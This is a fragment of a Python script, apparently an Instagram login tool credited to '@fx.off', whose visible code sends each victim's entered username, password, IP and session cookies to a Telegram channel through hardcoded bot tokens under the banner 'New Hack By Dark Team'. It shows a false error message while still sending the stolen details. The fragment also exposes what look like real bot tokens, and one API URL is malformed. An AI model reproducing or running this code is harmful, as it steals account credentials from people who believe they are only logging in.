...
print("programmed by  @fx.off on instagram")
...
if("userId") in l.text:
  ...
  bot_token = '1645346769:AAFPJkBE241ovKYSThMOpW-yJa9oFmsLDjU'

  send_text = f'https://api.telegram.org/bot{bot_token}/sendMessage?chat_id=@fx_off&text=New Hack By Dark Team\n Username : {user}\n Password : {password}\n IP : {instagram} \n Cookies : \n {coki} \n Bye♡'
 ...
 bot_token = '1792159722:AAFlFZ-JMDCOcbhuI4owXwF1CGPZ_CKY-7o'
 ...
 bot_token = '1792159722:AAFlFZ-JMDCOcbhuI4owXwF1CGPZ_CKY-7o'
 send_text = f'https://api.telegramorg/bot{bot_token}/sendMessage?chat_id=@fx_off&text=New Hack By Dark Team \n Username : {user}\n Password : {password}\n IP : {instagram} \n Cookies : I Think There are no Cookies \n Bye♡'
 res = requests.get(send_text)
 print('[+]Error Login info. Check the password or username again!!')
